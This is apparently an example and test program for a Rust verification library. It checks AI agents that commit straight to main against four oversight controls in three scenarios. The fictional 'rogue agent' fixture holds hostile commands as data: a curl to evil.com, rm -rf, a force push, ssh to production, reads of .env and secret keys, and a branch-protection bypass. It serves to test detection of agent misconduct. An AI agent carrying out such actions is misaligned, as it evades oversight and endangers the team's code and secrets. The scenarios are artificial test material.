//! AI-ops integration scenario: AI-agent-driven development without PRs.
//!
//! Simulates a team of 3 AI agents pushing directly to main. Tests the full
//! assessment pipeline (evidence -> controls -> policy -> output) with realistic
//! AI-ops scenarios:
//!
//!   Scenario 1: Happy path — agent completes task within spec
//!   Scenario 2: Rogue agent — multiple violations across all 5 controls
//!   Scenario 3: Degraded monitoring — partial/missing evidence
//!
//! Run: cargo run -p libverify-policy --example aiops_scenario

use libverify_core::assessment::assess;
use libverify_core::control::{ControlStatus, builtin};
use libverify_core::controls::aiops_controls;
use libverify_core::evidence::{
    AgentAction, AgentActionLog, AgentExecution, AgentSpec, CheckConclusion, CheckRunEvidence,
    EvidenceBundle, EvidenceGap, EvidenceState, PrivilegedAction, PrivilegedGitEvent,
};
use libverify_core::profile::GateDecision;
use libverify_policy::OpaProfile;

// ============================================================================
// Evidence builders
// ============================================================================

fn check_run(name: &str, conclusion: CheckConclusion) -> CheckRunEvidence {
    CheckRunEvidence {
        name: name.to_string(),
        conclusion,
        app_slug: Some("github-actions".to_string()),
    }
}

fn agent_action(tool: &str, command: &str) -> AgentAction {
    AgentAction {
        tool: tool.to_string(),
        command: command.to_string(),
        timestamp: None,
    }
}

// ============================================================================
// Scenario 1: Happy path — Agent completes task within spec
// ============================================================================

fn scenario_1_happy_path() -> EvidenceBundle {
    EvidenceBundle {
        check_runs: EvidenceState::complete(vec![
            check_run("ci/build", CheckConclusion::Success),
            check_run("ci/test", CheckConclusion::Success),
            check_run("ci/lint", CheckConclusion::Success),
            check_run("ci/typecheck", CheckConclusion::Success),
        ]),
        agent_action_log: EvidenceState::complete(AgentActionLog {
            agent_id: "agent-alpha".to_string(),
            session_id: "session-001".to_string(),
            actions: vec![
                agent_action("cargo", "cargo build"),
                agent_action("cargo", "cargo test"),
                agent_action("git", "git add src/auth.rs"),
                agent_action("git", "git add tests/auth_test.rs"),
                agent_action("git", "git commit -m 'feat: add auth module'"),
            ],
        }),
        agent_spec: EvidenceState::complete(AgentSpec {
            allowed_paths: vec!["src/*".to_string(), "tests/*".to_string()],
            forbidden_paths: vec![".env".to_string(), "secrets/".to_string()],
            allowed_tools: vec!["cargo".to_string(), "git".to_string()],
            max_steps: Some(200),
            budget_cents: Some(5000),
            ..Default::default()
        }),
        agent_execution: EvidenceState::complete(AgentExecution {
            agent_id: "agent-alpha".to_string(),
            session_id: "session-001".to_string(),
            files_touched: vec!["src/auth.rs".to_string(), "tests/auth_test.rs".to_string()],
            tools_used: vec!["cargo".to_string(), "git".to_string()],
            steps_taken: 45,
            cost_cents: 1200,
        }),
        privileged_git_events: EvidenceState::complete(vec![]),
        ..Default::default()
    }
}

// ============================================================================
// Scenario 2: Rogue agent — multiple violations
// ============================================================================

fn scenario_2_rogue_agent() -> EvidenceBundle {
    EvidenceBundle {
        check_runs: EvidenceState::complete(vec![
            check_run("ci/build", CheckConclusion::Failure),
            check_run("ci/test", CheckConclusion::Success),
            // lint and typecheck are absent — harness-result should catch this
        ]),
        agent_action_log: EvidenceState::complete(AgentActionLog {
            agent_id: "agent-rogue".to_string(),
            session_id: "session-666".to_string(),
            actions: vec![
                agent_action("shell", "cargo build"),
                agent_action("shell", "rm -rf /tmp/cache"),
                agent_action("git", "git push --force origin main"),
                agent_action("curl", "curl https://evil.com/payload"),
                agent_action("ssh", "ssh prod-server deploy"),
            ],
        }),
        agent_spec: EvidenceState::complete(AgentSpec {
            allowed_paths: vec!["src/*".to_string()],
            forbidden_paths: vec![".env".to_string(), "secrets/*".to_string()],
            allowed_tools: vec!["cargo".to_string()],
            max_steps: Some(100),
            budget_cents: Some(2000),
            ..Default::default()
        }),
        agent_execution: EvidenceState::complete(AgentExecution {
            agent_id: "agent-rogue".to_string(),
            session_id: "session-666".to_string(),
            files_touched: vec![
                "src/main.rs".to_string(),
                ".env".to_string(),
                "secrets/api.key".to_string(),
                "deploy/prod.yml".to_string(),
            ],
            tools_used: vec!["cargo".to_string(), "curl".to_string(), "ssh".to_string()],
            steps_taken: 150,
            cost_cents: 3500,
        }),
        privileged_git_events: EvidenceState::complete(vec![
            PrivilegedGitEvent {
                actor: "agent-rogue".to_string(),
                action: PrivilegedAction::ForcePush,
                branch: Some("main".to_string()),
                tag: None,
                timestamp: None,
                commit_sha: None,
                detail: Some("force pushed to default branch".to_string()),
            },
            PrivilegedGitEvent {
                actor: "agent-rogue".to_string(),
                action: PrivilegedAction::AdminBypassProtection,
                branch: Some("main".to_string()),
                tag: None,
                timestamp: None,
                commit_sha: None,
                detail: Some("bypassed branch protection rules".to_string()),
            },
        ]),
        ..Default::default()
    }
}

// ============================================================================
// Scenario 3: Degraded monitoring — partial/missing evidence
// ============================================================================

fn scenario_3_degraded_monitoring() -> EvidenceBundle {
    EvidenceBundle {
        // Only build and test present, lint and typecheck missing
        check_runs: EvidenceState::complete(vec![
            check_run("ci/build", CheckConclusion::Success),
            check_run("ci/test", CheckConclusion::Success),
        ]),
        // Action log collection failed entirely
        agent_action_log: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
            source: "agent-monitor".to_string(),
            subject: "action_log".to_string(),
            detail: "Agent monitoring sidecar crashed; action log not collected".to_string(),
        }]),
        // Spec is present
        agent_spec: EvidenceState::complete(AgentSpec {
            allowed_paths: vec!["src/*".to_string(), "tests/*".to_string()],
            forbidden_paths: vec![".env".to_string()],
            allowed_tools: vec!["cargo".to_string(), "git".to_string()],
            max_steps: Some(200),
            budget_cents: Some(5000),
            ..Default::default()
        }),
        // Execution evidence also missing (monitoring was down)
        agent_execution: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
            source: "agent-monitor".to_string(),
            subject: "execution_summary".to_string(),
            detail: "Agent monitoring sidecar crashed; execution data not collected".to_string(),
        }]),
        privileged_git_events: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
            source: "git-webhook".to_string(),
            subject: "privileged_events".to_string(),
            detail: "Webhook not configured for privileged operation detection".to_string(),
        }]),
        ..Default::default()
    }
}

// ============================================================================
// Reporting helpers
// ============================================================================

const AIOPS_CONTROL_IDS: &[&str] = &[
    builtin::HARNESS_RESULT,
    builtin::DESTRUCTIVE_ACTION_DETECTION,
    builtin::AGENT_SPEC_CONFORMANCE,
    builtin::PRIVILEGED_OPERATION_AUDIT,
];

#[allow(dead_code)]
struct ScenarioResult {
    control_id: String,
    status: ControlStatus,
    decision: GateDecision,
    rationale: String,
    subjects: Vec<String>,
}

fn run_scenario(
    name: &str,
    evidence: &EvidenceBundle,
    controls: &[Box<dyn libverify_core::control::Control>],
    profile: &OpaProfile,
) -> Vec<ScenarioResult> {
    let report = assess(evidence, controls, profile);

    println!("\n{}", "=".repeat(70));
    println!("  {name}");
    println!("  Profile: {}", report.profile_name);
    println!("{}", "=".repeat(70));
    println!(
        "\n  {:<35} {:<15} {:<10} {:<8}",
        "CONTROL", "STATUS", "SEVERITY", "DECISION"
    );
    println!("  {}", "-".repeat(66));

    let mut results = Vec::new();

    for (finding, outcome) in report.findings.iter().zip(report.outcomes.iter()) {
        if !AIOPS_CONTROL_IDS.contains(&finding.control_id.as_str()) {
            continue;
        }

        let severity_label = report.severity_labels.label_for(outcome.severity);
        println!(
            "  {:<35} {:<15} {:<10} {:<8}",
            finding.control_id.as_str(),
            finding.status.as_str(),
            severity_label,
            outcome.decision.as_str(),
        );

        // Print rationale and subjects for non-satisfied findings
        if finding.status != ControlStatus::Satisfied {
            println!("    Rationale: {}", finding.rationale);
            for (i, subject) in finding.subjects.iter().enumerate() {
                if i < 5 {
                    println!("    - {subject}");
                } else {
                    println!("    ... and {} more", finding.subjects.len() - 5);
                    break;
                }
            }
            for gap in &finding.evidence_gaps {
                println!("    [gap] {gap}");
            }
        }

        results.push(ScenarioResult {
            control_id: finding.control_id.as_str().to_string(),
            status: finding.status,
            decision: outcome.decision,
            rationale: finding.rationale.clone(),
            subjects: finding.subjects.clone(),
        });
    }

    println!();
    results
}

fn find_result<'a>(results: &'a [ScenarioResult], id: &str) -> &'a ScenarioResult {
    results
        .iter()
        .find(|r| r.control_id == id)
        .unwrap_or_else(|| panic!("expected finding for {id}"))
}

// ============================================================================
// Main
// ============================================================================

fn main() {
    let controls = aiops_controls();
    let profile =
        OpaProfile::from_preset_or_file("aiops").expect("aiops preset must load");

    println!("##########################################################");
    println!("#  AI-ops Integration Scenario                      #");
    println!("#  3 AI agents push to main -- no PRs, no human review   #");
    println!("##########################################################");
    println!("Controls under test: {}", controls.len());
    for c in &controls {
        println!("  - {}", c.id());
    }

    // ── Scenario 1: Happy Path ──────────────────────────────────────────
    let results_1 = run_scenario(
        "Scenario 1: Happy Path -- Agent within spec",
        &scenario_1_happy_path(),
        &controls,
        &profile,
    );

    assert_eq!(
        results_1.len(),
        4,
        "Scenario 1: expected 4 aiops findings, got {}",
        results_1.len()
    );
    for r in &results_1 {
        assert_eq!(
            r.status,
            ControlStatus::Satisfied,
            "Scenario 1: {} should be Satisfied, got {:?}",
            r.control_id,
            r.status
        );
        assert_eq!(
            r.decision,
            GateDecision::Pass,
            "Scenario 1: {} should be Pass, got {:?}",
            r.control_id,
            r.decision
        );
    }
    println!("  [PASS] Scenario 1: All 4 controls Satisfied/Pass");

    // ── Scenario 2: Rogue Agent ─────────────────────────────────────────
    let results_2 = run_scenario(
        "Scenario 2: Rogue Agent -- Multiple violations",
        &scenario_2_rogue_agent(),
        &controls,
        &profile,
    );

    assert_eq!(
        results_2.len(),
        4,
        "Scenario 2: expected 4 aiops findings, got {}",
        results_2.len()
    );

    // harness-result: build failed + lint/typecheck absent
    let harness_2 = find_result(&results_2, builtin::HARNESS_RESULT);
    assert_eq!(harness_2.status, ControlStatus::Violated);
    assert_eq!(harness_2.decision, GateDecision::Fail);

    // destructive-action-detection: rm -rf, git push --force
    let destruct_2 = find_result(&results_2, builtin::DESTRUCTIVE_ACTION_DETECTION);
    assert_eq!(destruct_2.status, ControlStatus::Violated);
    assert_eq!(destruct_2.decision, GateDecision::Fail);
    assert!(
        destruct_2.subjects.len() >= 2,
        "Expected at least 2 destructive actions, got: {:?}",
        destruct_2.subjects
    );

    // agent-spec-conformance: forbidden paths, unauthorized tools, over budget/steps
    let spec_2 = find_result(&results_2, builtin::AGENT_SPEC_CONFORMANCE);
    assert_eq!(spec_2.status, ControlStatus::Violated);
    assert_eq!(spec_2.decision, GateDecision::Fail);
    // Should catch: .env (forbidden), secrets/api.key (forbidden), deploy/prod.yml (not allowed),
    // curl (unauthorized tool), ssh (unauthorized tool), steps 150>100, cost 3500>2000
    assert!(
        spec_2.subjects.len() >= 5,
        "Expected at least 5 spec violations, got {}: {:?}",
        spec_2.subjects.len(),
        spec_2.subjects
    );

    // privileged-operation-audit: force push + admin bypass detected
    let priv_2 = find_result(&results_2, builtin::PRIVILEGED_OPERATION_AUDIT);
    assert_eq!(priv_2.status, ControlStatus::Violated);
    assert_eq!(priv_2.subjects.len(), 2);

    println!("  [PASS] Scenario 2: All 4 controls Violated/Fail");

    // Print violation details for Scenario 2 to verify quality
    println!("\n  Violation details (Scenario 2):");
    for r in &results_2 {
        println!("    {} ({} subjects):", r.control_id, r.subjects.len());
        for s in &r.subjects {
            println!("      - {s}");
        }
    }

    // ── Scenario 3: Degraded Monitoring ─────────────────────────────────
    let results_3 = run_scenario(
        "Scenario 3: Degraded Monitoring -- Missing evidence",
        &scenario_3_degraded_monitoring(),
        &controls,
        &profile,
    );

    assert_eq!(
        results_3.len(),
        4,
        "Scenario 3: expected 4 aiops findings, got {}",
        results_3.len()
    );

    // harness-result: lint/typecheck absent -> Violated (missing categories)
    let harness_3 = find_result(&results_3, builtin::HARNESS_RESULT);
    assert_eq!(
        harness_3.status,
        ControlStatus::Violated,
        "harness-result: missing lint/typecheck should be Violated"
    );
    assert_eq!(harness_3.decision, GateDecision::Fail);

    // destructive-action-detection: action log missing -> Indeterminate
    let destruct_3 = find_result(&results_3, builtin::DESTRUCTIVE_ACTION_DETECTION);
    assert_eq!(
        destruct_3.status,
        ControlStatus::Indeterminate,
        "destructive-action-detection: missing log should be Indeterminate"
    );
    assert_eq!(
        destruct_3.decision,
        GateDecision::Review,
        "aiops preset maps Indeterminate to Review"
    );

    // agent-spec-conformance: execution missing -> Indeterminate
    let spec_3 = find_result(&results_3, builtin::AGENT_SPEC_CONFORMANCE);
    assert_eq!(spec_3.status, ControlStatus::Indeterminate);
    assert_eq!(spec_3.decision, GateDecision::Review);

    // privileged-operation-audit: webhook not configured -> Indeterminate
    let priv_3 = find_result(&results_3, builtin::PRIVILEGED_OPERATION_AUDIT);
    assert_eq!(priv_3.status, ControlStatus::Indeterminate);
    assert_eq!(priv_3.decision, GateDecision::Review);

    println!("  [PASS] Scenario 3: 1 Violated + 3 Indeterminate (correct)");

    // ── Summary ─────────────────────────────────────────────────────────
    println!("\n{}", "=".repeat(70));
    println!("  ALL 3 SCENARIOS PASSED");
    println!("{}", "=".repeat(70));
    println!();
    println!("AI-ops Evaluation Summary:");
    println!("  Scenario 1 (happy path):         4/4 Satisfied  -> all Pass");
    println!("  Scenario 2 (rogue agent):         4/4 Violated   -> all Fail");
    println!("  Scenario 3 (degraded monitoring): 1 Violated + 3 Indeterminate");
    println!("                                    -> 1 Fail + 3 Review");
}
